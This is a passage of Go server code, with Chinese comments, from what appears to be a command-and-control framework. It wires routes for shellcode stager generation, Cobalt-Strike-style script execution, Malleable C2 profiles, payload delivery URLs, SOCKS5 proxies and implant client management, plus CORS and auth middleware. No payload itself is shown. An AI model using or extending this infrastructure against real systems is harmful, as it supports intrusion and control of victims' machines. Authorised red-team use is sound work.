		configAPI.GET("/export", config.ExportConfigHandler)
		configAPI.GET("/env-vars", config.GetConfigEnvironmentVariablesHandler)
	}

	// 仪表盘API
	protected.GET("/dashboard/stats", api.GetDashboardStats)

	// 插件相关API
	protected.GET("/plugin/list", api.GetPlugins)
	protected.GET("/plugin/details/:pluginName", api.GetPluginDetails)
	protected.GET("/plugin/download/:pluginName", api.DownloadPlugin)
	protected.POST("/plugin/upload", api.UploadPlugin)
	protected.DELETE("/plugin/delete/:pluginName", api.DeletePlugin)
	protected.GET("/client/online-clients", api.GetOnlineClients)

	// CNA 脚本（Aggressor Script 兼容）API
	operatorOnly.GET("/cna/scripts", api.ListCnaScripts)
	operatorOnly.GET("/cna/files", api.ListCnaFiles)
	operatorOnly.POST("/cna/load", api.LoadCnaScript)
	operatorOnly.POST("/cna/unload", api.UnloadCnaScript)
	operatorOnly.POST("/cna/reload", api.ReloadCnaScript)
	operatorOnly.POST("/cna/test", api.TestCnaScript)
	operatorOnly.POST("/cna/upload", api.UploadCnaScript)

	// C2 Profile（Malleable C2 Profile YAML）API
	operatorOnly.GET("/c2profile/list", api.ListC2Profiles)
	operatorOnly.GET("/c2profile/preview", api.PreviewC2Profile)
	operatorOnly.POST("/c2profile/save", api.SaveC2Profile)
	operatorOnly.POST("/cna/alias-exec", api.ExecCnaAlias)
	operatorOnly.GET("/cna/menus", api.ListCnaMenus)
	operatorOnly.POST("/cna/menu-exec", api.ExecCnaMenuItem)
	operatorOnly.POST("/cna/eval", api.EvalCnaScript)

	// Shellcode生成API
	shellcodeAPI := protected.Group("/shellcode")
	{
		shellcodeAPI.POST("/dynamic-stager", api.DynamicStageShellCodeGen)
		shellcodeAPI.POST("/stage", api.StageShellCodeGen)
		shellcodeAPI.GET("/stager-info", api.GetStagerBuildInfo)
	}

	//t := r.Group("/tencent")
	//{
	//	t.GET("/mcp/pc/pcsearch", communication.Get)
	//	t.POST("/sensearch/collection/item/check", communication.Post)
	//}

	// 创建自定义HTTP服务器配置，增加超时时间
	// P1-2A: 收紧至 30s/30s/90s（原 120s/120s/300s 慢客户端占满 worker → 慢速 DoS）
	// 文件上传/下载保持 120s：由 handler 级 context.WithTimeout 覆盖 /client/file/upload 等
	server := &http.Server{
		Addr:           "0.0.0.0:" + strconv.Itoa(*bindPort),
		Handler:        r,
		ReadTimeout:    30 * time.Second,
		WriteTimeout:   30 * time.Second,
		IdleTimeout:    90 * time.Second,
		MaxHeaderBytes: 1 << 20,           // 1MB
	}

	// 恢复 status=1 的 WebDelivery 到 Delivery Hub（shared/dedicated）
	go func() {
		// 稍等主端口已写入 Hub
		time.Sleep(200 * time.Millisecond)
		api.RestoreWebDeliveriesOnStartup()
		// 恢复运行中的 SOCKS5 代理监听（在线客户端会重新收到连接命令）
		api.RestoreSocks5OnStartup()
	}()

	// 异步启动 HTTP 服务器
	go func() {
		fmt.Println("Listening on port ", *bindPort)
		fmt.Println("Delivery Hub: GET /d/{key}/full|stager|sc|woff")
		fmt.Println("HTTP Server Timeouts: Read=30s, Write=30s, Idle=90s")
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("HTTP服务器启动失败: %v\n", err)
			os.Exit(1)
		}
	}()

	// 监听系统退出信号 (SIGINT, SIGTERM) 进行优雅关闭
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit
	fmt.Println("⚠️ 接收到退出信号，正在优雅关闭 HTTP 服务器与资源连接...")

	// 关闭 dedicated WebDelivery 投递服务器
	api.CloseAllWebDeliveryServers()

	// 停止统一离线检测器
	if connection.GlobalOfflineDetector != nil {
		connection.GlobalOfflineDetector.Stop()
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := server.Shutdown(ctx); err != nil {
		fmt.Printf("❌ 服务器强制关闭失败: %v\n", err)
	} else {
		fmt.Println("✅ HTTP 服务器与数据库句柄平滑退出完成")
	}
}
func Cors() gin.HandlerFunc {
	// D43: 允许的 Origin 白名单（空 = 仅同源；CDN/反向代理部署可在配置 delivery.cors_allow_origin 指定）
	allowedOrigins := make(map[string]bool)
	if g := config.GetGlobalConfig(); g != nil && g.Delivery.CORSAllowOrigin != "" {
		for _, o := range strings.Split(g.Delivery.CORSAllowOrigin, ",") {
			if o = strings.TrimSpace(o); o != "" {
				allowedOrigins[o] = true
			}
		}
	}
	return func(c *gin.Context) {
		method := c.Request.Method
		origin := c.Request.Header.Get("Origin")
		if origin != "" {
			// 白名单匹配：同源（无 Origin 头）或显式配置的域名才允许跨域
			if allowedOrigins[origin] {
				c.Header("Access-Control-Allow-Origin", origin)
				c.Header("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE, UPDATE")
				c.Header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization, Authorization2")
				c.Header("Access-Control-Expose-Headers", "Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type")
				c.Header("Access-Control-Allow-Credentials", "true")
			}
			// 非白名单 Origin：不设置 CORS 头（浏览器将阻止跨域读取响应）
		}
		if method == "OPTIONS" {
			c.AbortWithStatus(http.StatusNoContent)
		}
		c.Next()
	}
}

// 在 JWT 中间件之前先做 Authorization2 头的健壮性校验，避免后续切片越界造成 panic
func SafeAuthHeaderGuard() gin.HandlerFunc {
	return func(c *gin.Context) {
		h := c.GetHeader("Authorization2")
		// OPSEC 双通道认证:header 为空时放行,由 AuthMiddleware 尝试 HttpOnly Cookie
		//（页面刷新后 token 仅存内存,Cookie 认证必须可达,否则刷新即跳登录）
		if h == "" {
			c.Next()
			return
		}
		if !strings.HasPrefix(h, "Bearer ") || len(h) <= len("Bearer ") {
			c.JSON(http.StatusUnauthorized, gin.H{
				"status": http.StatusUnauthorized,
				"data":   "Unauthorized",
			})
			c.Abort()
			return
		}
		c.Next()
	}
}
